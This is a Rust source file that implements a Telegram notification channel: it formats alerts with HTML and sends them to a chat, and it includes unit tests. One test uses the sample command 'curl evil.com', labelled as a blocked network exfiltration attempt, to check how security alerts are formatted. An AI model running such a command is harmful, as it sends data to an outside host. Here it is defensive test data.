//! Telegram notification channel.

use teloxide::prelude::Requester;

use super::{Category, Notification, NotificationChannel, Severity};
use async_trait::async_trait;

/// Telegram notification channel.
///
/// Delivers notifications as Telegram messages to a specific chat.
/// `address` = Telegram chat_id as string.
/// Supports HTML formatting (limited subset: `<b>`, `<code>`, `<a>`).
#[derive(Debug)]
pub struct TelegramChannel {
    bot: teloxide::Bot,
}

impl TelegramChannel {
    pub fn new(token: String) -> Self {
        Self {
            bot: teloxide::Bot::new(token),
        }
    }

    /// Build from existing Bot instance.
    pub fn from_bot(bot: teloxide::Bot) -> Self {
        Self { bot }
    }

    /// Format notification for Telegram.
    fn format_message(notification: &Notification) -> String {
        let icon = notification.severity.emoji();
        let category_label = notification.category.label();

        format!(
            "{icon} <b>[{category_label}]</b>\n{body}",
            icon = icon,
            category_label = category_label,
            body = notification.body,
        )
    }
}

#[async_trait]
impl NotificationChannel for TelegramChannel {
    fn channel_type(&self) -> &str {
        "telegram"
    }

    fn name(&self) -> &str {
        "telegram"
    }

    async fn deliver_to(&self, address: &str, notification: &Notification) -> anyhow::Result<()> {
        let chat_id: i64 = address.parse()
            .map_err(|_| anyhow::anyhow!("Invalid Telegram chat_id: {address}"))?;

        let text = Self::format_message(notification);

        self.bot
            .send_message(teloxide::types::ChatId(chat_id), &text)
            .await
            .map_err(|e| anyhow::anyhow!("Telegram send failed: {e}"))?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::notifications::Notification;

    #[test]
    fn test_format_shield_alert() {
        let n = Notification::shield_alert("acc_1", 1234, "root", "curl evil.com", "network-exfil", "blocked");
        let msg = TelegramChannel::format_message(&n);
        assert!(msg.contains("🚨"));
        assert!(msg.contains("Shield"));
        assert!(msg.contains("curl evil.com"));
    }

    #[test]
    fn test_format_system_event() {
        let n = Notification::system("Deploy complete", "v1.2.3 deployed", Severity::Info);
        let msg = TelegramChannel::format_message(&n);
        assert!(msg.contains("ℹ️"));
        assert!(msg.contains("System"));
    }

    #[test]
    fn test_channel_type() {
        let ch = TelegramChannel::new("test_token".into());
        assert_eq!(ch.channel_type(), "telegram");
        assert_eq!(ch.name(), "telegram");
    }
}
